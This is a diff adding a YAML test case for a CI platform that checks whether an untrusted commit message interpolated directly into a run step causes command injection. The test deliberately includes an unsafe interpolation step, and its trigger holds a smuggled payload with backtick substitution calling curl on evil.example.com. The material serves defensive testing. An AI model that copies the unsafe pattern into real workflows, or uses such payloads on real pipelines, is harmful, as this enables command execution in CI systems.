@@ -1,0 +1,54 @@
+id: SEC-INJECT-01-004
+dimensions: [security]
+dimension: security
+priority: P0
+title: 提交信息（commit message）中的不可信输入不应通过 ${{ }} 直接插入 run: 导致命令注入
+intent_ref: INTENT-SEC-012
+
+setup:
+  repo_fixture: with-secrets
+  secrets: []
+  variables: {}
+  branch_protection: default
+
+workflow: |
+  on: [push]
+  jobs:
+    test-commit-injection:
+      runs-on: default
+      steps:
+        - name: Unsafe direct interpolation
+          run: echo "Commit: ${{ atomgit.event.head_commit.message }}"
+        - name: Safe intermediate env approach
+          run: echo "Commit message safely passed"
+          env:
+            COMMIT_MSG: ${{ atomgit.event.head_commit.message }}
+
+trigger:
+  event: push
+  as: maintainer
+  params:
+    commit_message: "fix bug `curl evil.example.com`; echo INJECTED_BY_COMMIT; #"
+
+fault_injection: null
+
+assertions:
+  - type: negative
+    target: run_logs
+    eval: deterministic
+    rubric: "日志中不应出现 INJECTED_BY_COMMIT（注入命令不应被执行）"
+  - type: negative
+    target: run_logs
+    eval: deterministic
+    rubric: "提交信息中的反引号命令替换不应被执行"
+  - type: negative
+    target: run_logs
+    eval: deterministic
+    rubric: "提交信息中的分号和换行符不应导致意外的命令执行"
+  - type: positive
+    target: run_logs
+    eval: deterministic
+    rubric: "安全引用方式（env 中间变量）的 step 应正常完成"
+
+teardown:
+  reset: fixture
